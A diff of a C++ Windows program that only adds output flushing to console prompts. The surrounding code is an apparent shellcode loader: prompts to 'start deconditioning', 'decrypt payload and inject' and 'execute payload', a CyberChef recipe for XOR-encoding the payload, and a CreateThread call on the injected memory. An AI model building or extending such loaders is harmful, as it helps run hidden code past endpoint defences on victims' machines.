@@ -28,7 +28,7 @@ int main(int argc, char** argv) {
         return 1;
     }
 
-    std::cout << "Press ENTER to start deconditioning";
+    std::cout << "Press ENTER to start deconditioning" << std::flush;
     std::cin.get();
 
     BYTE nonsense[4096] = {};
@@ -84,7 +84,8 @@ int main(int argc, char** argv) {
         }
     }
 
-    std::cout << "Press ENTER to decrypt payload and inject";
+    std::cout << "\n";
+    std::cout << "Press ENTER to decrypt payload and inject" << std::flush;
     std::cin.get();
 
     // https://cyberchef.org/#recipe=From_Hex('Auto')XOR(%7B'option':'UTF8','string':'AB'%7D,'Standard',false)To_Hex('0x%20with%20comma',0)&input=
@@ -115,7 +116,7 @@ int main(int argc, char** argv) {
         return 1;
     }
 
-	std::cout << "Press ENTER to execute payload";
+	std::cout << "Press ENTER to execute payload" << std::flush;
 	std::cin.get();
 
     HANDLE hThread = CreateThread(nullptr, 0, (LPTHREAD_START_ROUTINE)new_addr, nullptr, 0, nullptr);
